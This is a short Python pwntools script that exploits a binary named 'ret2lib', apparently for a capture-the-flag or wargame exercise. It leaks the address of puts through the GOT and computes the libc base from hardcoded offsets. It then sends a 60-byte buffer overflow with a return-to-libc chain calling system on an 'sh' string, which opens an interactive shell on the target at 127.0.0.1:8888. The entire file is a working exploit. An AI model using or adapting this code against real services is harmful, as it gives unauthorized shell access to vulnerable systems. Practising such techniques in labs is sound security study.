#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "127.0.0.1"
port = 8888

r = remote(host,port)

r.recvuntil(":")
puts_got = 0x0804a01c # puts address, objdump -R ./ret2lib

r.sendline(str(puts_got)) # convert to decimal 
r.recvuntil(": ")
puts_adr = int(r.recvuntil("\n").strip(),16)
puts_off = 0x67460 # puts offset, gdb$ off puts
system_off = 0x3ce10 # system offset, gdb$ off system
libc = puts_adr - puts_off # address - offset = base
print "libc : ",hex(libc)
system = libc + system_off # system address
sh = 0x804829e # sh address, gdb$ find "sh"
r.recvuntil(":")
payload = "a"*60 # offset 
payload += p32(system)
payload += "bbbb" # fill up the return address,  or += p32(0xdeadbeef) is also fine
payload += p32(sh) # sh address
r.sendline(payload)
r.interactive()
